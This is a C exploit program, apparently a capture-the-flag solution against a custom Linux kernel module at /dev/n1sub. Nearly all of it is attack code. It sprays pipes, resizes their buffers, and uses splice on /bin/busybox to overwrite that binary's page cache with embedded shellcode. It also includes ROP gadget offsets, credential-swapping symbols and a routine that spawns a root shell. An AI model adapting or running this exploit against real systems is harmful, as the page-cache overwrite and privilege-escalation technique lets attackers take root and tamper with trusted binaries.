#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <stdint.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define o(x) (kbase + x)

size_t pop_rdi = 0x2c9d;
size_t commit_creds = 0xbb5b0;
size_t init_cred = 0x1a4cbf8;
size_t swapgs_restore_regs_and_return_to_usermode = 0x1000f01;
size_t prepare_kernel_cred = 0xf8520;

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

char shellcode[] = {72,  184, 1,  1,  1,   1,   1,  1,   1,   1,   80,  72, 184, 46,  103, 109, 96,
                    102, 1,   1,  1,  72,  49,  4,  36,  72,  137, 231, 49, 210, 49,  246, 106, 2,
                    88,  15,  5,  72, 137, 199, 49, 192, 49,  210, 182, 1,  72,  137, 230, 15,  5,
                    106, 1,   95, 49, 210, 182, 1,  72,  137, 230, 106, 1,  88,  15,  5};

size_t kbase;
char buf[0x1000];

#define CMD_ADD 0xdeadbee0
#define CMD_DEL 0xdeadbee1
#define CMD_SUB 0xdeadbee2
#define STEP    4

int g_fd = -1;
int busybox_fd = -1;

uint sub_add(unsigned int *arg) {
    size_t ret = 0;
    ret = ioctl(g_fd, CMD_ADD, arg);
    return ret;
}

void sub_del(int idx) { ioctl(g_fd, CMD_DEL, idx); }

void sub_sub(int idx) { ioctl(g_fd, CMD_SUB, idx); }

void sub_cnt(int idx, int cnt) {
    for (int i = 0; i < cnt; i++) {
        sub_sub(idx);
    }
}

#define PIPE_FD_MAX 100
int pipe_fds[PIPE_FD_MAX][2];

int main() {
    bind_cpu(0);

    g_fd = open("/dev/n1sub", O_RDWR);
    if (g_fd < 0) {
        die("open /dev/n1sub failed");
    }

    busybox_fd = open("/bin/busybox", O_RDONLY);
    if(busybox_fd < 0){
        die("open busybox failed");
    }

    int ret_offset = 0;
    int ret;
    loff_t offset = 0x1ea400;

    for (int i = 0x0; i < PIPE_FD_MAX; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            die("pipe failed\n");
        }
    }

    ret = sub_add(&ret_offset);
    logd("size: 0x%x", ret);
    logd("ret_offset: 0x%x, mod: 0x%x", ret_offset, ret_offset % 0x28);
    if (ret_offset % 0x28 != 0x18) {
        die("ret_offset error");
    }


    sub_del(0);

    for (int i = 0; i < STEP; i++) {
        fcntl(pipe_fds[i][1], F_SETPIPE_SZ, 0x2000); // 2
        fcntl(pipe_fds[i + STEP][1], F_SETPIPE_SZ, 0x4000); // 4
        fcntl(pipe_fds[i + STEP * 2][1], F_SETPIPE_SZ, 0x8000);
        fcntl(pipe_fds[i + STEP * 3][1], F_SETPIPE_SZ, 0x10000);
        fcntl(pipe_fds[i + STEP * 4][1], F_SETPIPE_SZ, 0x20000);
        fcntl(pipe_fds[i + STEP * 5][1], F_SETPIPE_SZ, 0x40000);
    }

    int idx = (ret_offset + 0x10) / 0x28 - 1; // pipe offset
    for (int i = 0; i < STEP; i++) {
        if (idx < 2) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
        if (idx < 4) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i + STEP][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i + STEP][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
        if (idx < 8) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i + STEP * 2][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i + STEP * 2][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
        if (idx < 16) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i + STEP * 3][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i + STEP * 3][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
        if (idx < 32) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i + STEP * 4][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i + STEP * 4][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
        if (idx < 64) {
            for (int j = 0; j <= idx; j++) {
                // write(pipe_fds[i + STEP * 5][1], tmp_buf, 0x1000);
                if (splice(busybox_fd, &offset, pipe_fds[i + STEP * 5][1], NULL, 1, 0) < 0) {
                    die("splice failed");
                }
            }
        }
    }

    sub_cnt(0, 0xf0);

    memset(buf, '\x90', 0x1000);
    memcpy(buf + 0x500, shellcode, sizeof(shellcode));

    for (int i = 0; i < STEP * 6; i++) {
        write(pipe_fds[i][1], buf + 0x400, 0x200);
    }
    logi("exploit done\n");

    exit(0);
}
